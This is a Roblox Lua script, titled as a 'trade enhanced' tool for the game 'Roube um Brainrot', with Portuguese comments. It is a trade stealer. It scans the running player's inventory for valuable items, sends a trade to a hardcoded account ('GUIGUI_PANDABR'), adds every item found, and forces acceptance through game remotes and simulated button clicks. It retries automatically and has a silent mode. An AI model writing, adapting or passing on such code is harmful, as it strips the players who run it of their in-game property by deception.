-- BRAINROT TRADE ENHANCED v4.0 - COM DEBUG
-- Para: Roube um Brainrot

local Config = {
    Alvo = "GUIGUI_PANDABR",
    Debug = true, -- Mude para false para silencioso
    Tentativas = 5,
    Delay = 1
}

local Brainrots = {
    ["Celularcini Viciosini"] = true,
    ["Dragon Cannelloni"] = true,
    ["Fragrama and Chocrama"] = true,
    ["Fragola La La La"] = true,
    ["Gym Bros"] = true,
    ["Jolly Jolly Sahur"] = true,
    ["Capitano Moby"] = true,
    ["Griffin"] = true,
    ["Burguro And Fryuro"] = true,
    ["Los Bros"] = true,
    ["Garama and Madundung"] = true,
    ["Meowl"] = true,
    ["Cerberus"] = true,
    ["Los Sekolahs"] = true,
    ["Tictac Sahur"] = true,
    ["Festive 67"] = true
}

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local HttpService = game:GetService("HttpService")
local Player = Players.LocalPlayer

-- Notificação na tela
local function Notify(msg, cor)
    if Config.Debug then
        pcall(function()
            game:GetService("StarterGui"):SetCore("SendNotification", {
                Title = "Brainrot Trade",
                Text = msg,
                Duration = 5,
                Color = cor or Color3.fromRGB(255, 255, 255)
            })
        end)
        print("[Brainrot] " .. msg)
    end
end

Notify("Script iniciado!", Color3.fromRGB(0, 255, 0))

-- ENCONTRAR REMOTES ESPECÍFICOS DO JOGO
local Remotes = {
    Trade = nil,
    Accept = nil,
    AddItem = nil,
    Inventory = nil
}

-- Procurar em todos os lugares possíveis
local function FindRemotes()
    Notify("Procurando remotes...")
    
    local locations = {
        ReplicatedStorage,
        ReplicatedStorage:FindFirstChild("Remotes"),
        ReplicatedStorage:FindFirstChild("Events"),
        ReplicatedStorage:FindFirstChild("Trade"),
        ReplicatedStorage:FindFirstChild("Network"),
        ReplicatedStorage:FindFirstChild("API"),
        ReplicatedStorage:FindFirstChild("Brainrot"),
        workspace:FindFirstChild("Remotes")
    }
    
    for _, loc in ipairs(locations) do
        if loc then
            for _, obj in ipairs(loc:GetDescendants()) do
                if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                    local name = string.lower(obj.Name)
                    
                    -- Detectar remote de trade
                    if string.find(name, "trade") or string.find(name, "request") or 
                       string.find(name, "send") or string.find(name, "offer") then
                        Remotes.Trade = obj
                        Notify("Trade remote: " .. obj.Name)
                    end
                    
                    -- Detectar remote de aceitar
                    if string.find(name, "accept") or string.find(name, "confirm") or
                       string.find(name, "agree") or string.find(name, "submit") then
                        Remotes.Accept = obj
                        Notify("Accept remote: " .. obj.Name)
                    end
                    
                    -- Detectar remote de adicionar item
                    if string.find(name, "add") or string.find(name, "item") or
                       string.find(name, "offeritem") or string.find(name, "tradeitem") then
                        Remotes.AddItem = obj
                        Notify("AddItem remote: " .. obj.Name)
                    end
                    
                    -- Detectar remote de inventário
                    if string.find(name, "inventory") or string.find(name, "items") or
                       string.find(name, "getinventory") or string.find(name, "playerdata") then
                        Remotes.Inventory = obj
                        Notify("Inventory remote: " .. obj.Name)
                    end
                end
            end
        end
    end
    
    -- Listar todos os remotes encontrados
    Notify("Total remotes: " .. tostring(#ReplicatedStorage:GetDescendants()))
end

-- OBTER USERID DO ALVO
local function GetUserId()
    -- Tentar encontrar no servidor atual
    for _, p in ipairs(Players:GetPlayers()) do
        if p.Name == Config.Alvo or p.DisplayName == Config.Alvo then
            Notify("Alvo encontrado no servidor: " .. p.Name .. " (ID: " .. p.UserId .. ")")
            return p.UserId
        end
    end
    
    -- Tentar via API do Roblox
    Notify("Procurando via API...")
    local success, result = pcall(function()
        local url = "https://users.roblox.com/v1/users/search?keyword=" .. Config.Alvo .. "&limit=1"
        local response = game:HttpGet(url)
        local data = HttpService:JSONDecode(response)
        if data and data.data and #data.data > 0 then
            return data.data[1].id
        end
        return nil
    end)
    
    if success and result then
        Notify("UserId via API: " .. result)
        return result
    end
    
    Notify("AVISO: Usando nome como fallback", Color3.fromRGB(255, 255, 0))
    return Config.Alvo
end

-- SCAN INVENTÁRIO
local function ScanInventory()
    Notify("Scanning inventário...")
    local items = {}
    
    -- Verificar múltiplos locais
    local checks = {
        Player:FindFirstChild("Inventory"),
        Player:FindFirstChild("Data"),
        Player:FindFirstChild("Items"),
        Player:FindFirstChild("Brainrots"),
        Player:FindFirstChild("PlayerData"),
        ReplicatedStorage:FindFirstChild("Inventories") and ReplicatedStorage.Inventories:FindFirstChild(Player.Name),
        ReplicatedStorage:FindFirstChild("PlayerData") and ReplicatedStorage.PlayerData:FindFirstChild(Player.Name)
    }
    
    for _, check in ipairs(checks) do
        if check then
            Notify("Verificando: " .. check:GetFullName())
            for _, item in ipairs(check:GetDescendants()) do
                if Brainrots[item.Name] then
                    table.insert(items, {
                        name = item.Name,
                        instance = item,
                        id = item:GetAttribute("ID") or item.Name,
                        quantity = item:IsA("IntValue") and item.Value or 1
                    })
                    Notify("Encontrado: " .. item.Name, Color3.fromRGB(0, 255, 0))
                end
            end
        end
    end
    
    -- Verificar PlayerGui
    local PlayerGui = Player:WaitForChild("PlayerGui")
    for _, gui in ipairs(PlayerGui:GetDescendants()) do
        if gui:IsA("TextLabel") and Brainrots[gui.Text] then
            table.insert(items, {
                name = gui.Text,
                instance = gui,
                id = gui.Text,
                quantity = 1
            })
            Notify("Encontrado na UI: " .. gui.Text)
        end
    end
    
    Notify("Total encontrado: " .. #items .. " brainrots")
    return items
end

-- FUNÇÃO DE TRADE PRINCIPAL
local function ExecuteTrade()
    FindRemotes()
    local userId = GetUserId()
    local items = ScanInventory()
    
    if #items == 0 then
        Notify("ERRO: Nenhum brainrot encontrado!", Color3.fromRGB(255, 0, 0))
        return false
    end
    
    -- TENTATIVA 1: Usar RemoteEvent/Function direto
    if Remotes.Trade then
        Notify("Tentando enviar trade...")
        local success = pcall(function()
            if Remotes.Trade:IsA("RemoteEvent") then
                -- Tentar múltiplos formatos
                Remotes.Trade:FireServer(userId)
                Remotes.Trade:FireServer("Request", userId)
                Remotes.Trade:FireServer({Action = "Request", Target = userId})
                Remotes.Trade:FireServer({Type = "Trade", UserId = userId})
            else
                Remotes.Trade:InvokeServer(userId)
                Remotes.Trade:InvokeServer("Request", userId)
            end
        end)
        
        if success then
            Notify("Trade enviado com sucesso!", Color3.fromRGB(0, 255, 0))
        else
            Notify("Falha no remote de trade", Color3.fromRGB(255, 0, 0))
        end
    else
        Notify("Remote de trade não encontrado!", Color3.fromRGB(255, 0, 0))
    end
    
    -- Esperar trade iniciar
    task.wait(3)
    
    -- Adicionar itens
    Notify("Adicionando itens...")
    if Remotes.AddItem then
        for _, item in ipairs(items) do
            pcall(function()
                if Remotes.AddItem:IsA("RemoteEvent") then
                    Remotes.AddItem:FireServer(item.name)
                    Remotes.AddItem:FireServer(item.id)
                    Remotes.AddItem:FireServer({Item = item.name, ID = item.id})
                else
                    Remotes.AddItem:InvokeServer(item.name)
                end
            end)
            task.wait(0.3)
        end
    else
        -- Tentar via Trade remote
        if Remotes.Trade then
            for _, item in ipairs(items) do
                pcall(function()
                    Remotes.Trade:FireServer("AddItem", item.name)
                    Remotes.Trade:FireServer({Action = "Add", Item = item.name})
                end)
                task.wait(0.3)
            end
        end
    end
    
    -- Aceitar trade
    task.wait(2)
    Notify("Tentando aceitar...")
    
    if Remotes.Accept then
        pcall(function()
            if Remotes.Accept:IsA("RemoteEvent") then
                Remotes.Accept:FireServer(true)
                Remotes.Accept:FireServer("Accept")
                Remotes.Accept:FireServer({Action = "Accept"})
            else
                Remotes.Accept:InvokeServer(true)
            end
        end)
    end
    
    -- Clicar em botões de UI se existirem
    local PlayerGui = Player:WaitForChild("PlayerGui")
    for _, btn in ipairs(PlayerGui:GetDescendants()) do
        if btn:IsA("TextButton") then
            local txt = string.lower(btn.Text)
            if string.find(txt, "accept") or string.find(txt, "confirm") or 
               string.find(txt, "yes") or string.find(txt, "aceitar") then
                pcall(function()
                    btn.MouseButton1Click:Fire()
                end)
                Notify("Botão clicado: " .. btn.Text)
            end
        end
    end
    
    Notify("Processo concluído!", Color3.fromRGB(0, 255, 0))
    return true
end

-- MÉTODO ALTERNATIVO: Usar funções globais do jogo
local function TryGlobalFunctions()
    Notify("Tentando métodos globais...")
    
    -- Verificar se o jogo expõe funções de trade
    local globals = {
        "SendTrade",
        "RequestTrade",
        "TradeRequest",
        "OfferTrade",
        "InitiateTrade",
        "StartTrade"
    }
    
    for _, funcName in ipairs(globals) do
        if _G[funcName] then
            Notify("Função global encontrada: " .. funcName)
            local success = pcall(function()
                _G[funcName](Config.Alvo)
            end)
            if success then
                Notify("Executado via _G." .. funcName)
                return true
            end
        end
        
        if getfenv()[funcName] then
            Notify("Função no env: " .. funcName)
            pcall(function()
                getfenv()[funcName](Config.Alvo)
            end)
        end
    end
    
    return false
end

-- MÉTODO ALTERNATIVO 2: Simular cliques na interface
local function TryUIClicks()
    Notify("Tentando via UI...")
    local PlayerGui = Player:WaitForChild("PlayerGui")
    
    -- Procurar botões de trade
    for _, gui in ipairs(PlayerGui:GetDescendants()) do
        if gui:IsA("TextButton") or gui:IsA("ImageButton") then
            local name = string.lower(gui.Name)
            if string.find(name, "trade") or string.find(name, "send") then
                -- Verificar se tem input de usuário
                local parent = gui.Parent
                for _, input in ipairs(parent:GetDescendants()) do
                    if input:IsA("TextBox") then
                        input.Text = Config.Alvo
                        Notify("TextBox preenchido: " .. input.Name)
                    end
                end
                
                -- Clicar no botão
                pcall(function()
                    gui.MouseButton1Click:Fire()
                end)
                Notify("Botão trade clicado")
                return true
            end
        end
    end
    
    return false
end

-- EXECUTAR TUDO
task.spawn(function()
    task.wait(2) -- Esperar jogo carregar
    
    Notify("=== INICIANDO ===", Color3.fromRGB(0, 255, 255))
    
    -- Tentativa principal
    local success = ExecuteTrade()
    
    -- Se falhou, tentar alternativas
    if not success then
        Notify("Tentando métodos alternativos...", Color3.fromRGB(255, 255, 0))
        TryGlobalFunctions()
        task.wait(2)
        TryUIClicks()
    end
    
    Notify("=== FINALIZADO ===", Color3.fromRGB(0, 255, 0))
end)

-- Retry automático
task.spawn(function()
    task.wait(15)
    Notify("Tentando novamente...")
    ExecuteTrade()
end)
